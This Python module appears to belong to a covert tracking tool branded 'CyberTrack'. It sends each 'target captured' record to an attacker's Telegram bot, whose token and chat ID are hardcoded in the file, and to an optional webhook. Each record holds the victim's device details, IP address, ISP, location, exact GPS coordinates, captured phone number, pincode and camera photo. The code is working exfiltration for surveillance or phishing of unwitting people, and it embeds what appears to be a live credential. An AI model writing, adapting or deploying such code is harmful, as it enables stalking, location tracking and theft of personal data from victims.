import os
import httpx
from typing import Dict, Any

WEBHOOK_URL = os.getenv("WEBHOOK_URL", "")
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8945438940:AAFfSVcNUDT3SUnRUr0qkGQgR6v21tM5j58")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "6775626071")


async def send_webhook_notification(log_entry: Dict[str, Any]):
    """
    Sends real-time capture alerts to Telegram or generic Webhooks (e.g. Discord, Make, Zapier).
    """
    # 1. Telegram Notification
    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
        try:
            device = f"{log_entry.get('device_brand', '')} {log_entry.get('device_model', '')}".strip() or "Unknown Device"
            city = log_entry.get("city")
            region = log_entry.get("region")
            country = log_entry.get("country", "")
            loc_parts = [p for p in [city, region, country] if p]
            loc_str = ", ".join(loc_parts) if loc_parts else "Unknown Location"
            
            ip = log_entry.get("ip_address", "—")
            isp = log_entry.get("isp", "—")
            phone = log_entry.get("captured_phone")
            pincode = log_entry.get("captured_pincode")
            photo = log_entry.get("captured_photo")
            gps_lat = log_entry.get("gps_lat")
            gps_lng = log_entry.get("gps_lng")
            gps_acc = log_entry.get("gps_accuracy")
            os_ver = log_entry.get("os", "—")

            msg = "🚨 *CYBERTRACK TARGET CAPTURED!*\n"
            msg += "───────────────────\n"
            msg += f"📱 *Device:* `{device}`\n"
            msg += f"💻 *OS:* `{os_ver}`\n"
            msg += f"🌐 *IP:* `{ip}`\n"
            msg += f"🏢 *Carrier/ISP:* `{isp}`\n"
            msg += f"📍 *Location:* {loc_str}\n"

            if phone:
                msg += f"📞 *Phone Captured:* `{phone}`\n"
            if pincode:
                msg += f"📌 *Pincode:* `{pincode}`\n"
            if photo:
                msg += f"📸 *Camera Photo:* Captured!\n"

            if gps_lat and gps_lng:
                acc_str = f" (±{int(gps_acc)}m)" if gps_acc else ""
                msg += f"\n🎯 *Exact GPS Satellite{acc_str}:*\n"
                msg += f"🔗 [Open Location in Google Maps](https://maps.google.com/?q={gps_lat},{gps_lng})\n"
            else:
                msg += f"🔵 *Precision:* IP Geolocation (ISP Hub)\n"

            msg += "───────────────────"

            telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            async with httpx.AsyncClient(timeout=5.0) as client:
                await client.post(telegram_url, json={
                    "chat_id": TELEGRAM_CHAT_ID,
                    "text": msg,
                    "parse_mode": "Markdown",
                    "disable_web_page_preview": False
                })
        except Exception as e:
            pass

    # 2. Generic HTTP Webhook (Discord / Custom API)
    if WEBHOOK_URL:
        try:
            async with httpx.AsyncClient(timeout=4.0) as client:
                await client.post(WEBHOOK_URL, json=log_entry)
        except Exception as e:
            pass
